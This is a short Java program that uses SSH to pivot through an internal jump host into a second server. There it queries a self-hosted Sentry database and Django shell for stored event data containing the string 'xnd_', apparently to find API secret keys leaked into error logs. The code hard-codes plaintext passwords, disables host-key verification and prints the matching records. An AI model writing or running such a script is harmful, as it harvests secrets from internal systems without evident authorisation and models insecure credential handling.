import com.jcraft.jsch.*;
import java.io.*;
class DK0 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // Extract raw bytes and decode - Sentry stores data as zlib compressed JSON  
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'docker exec sentry-self-hosted-postgres-1 psql -U postgres -c \"SELECT id FROM nodestore_node WHERE cast(data as text) LIKE \\$\\$%xnd_%\\$\\$ LIMIT 5\" 2>&1;echo ---DECOMPRESS---;docker exec sentry-self-hosted-web-1 sentry django shell -c \"from sentry.nodestore.django.models import Node;nodes=Node.objects.filter(data__contains=\\\"xnd_\\\")[:3];[print(n.id,str(n.data)[:500]) for n in nodes]\" 2>&1 | grep xnd_ | head -5' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
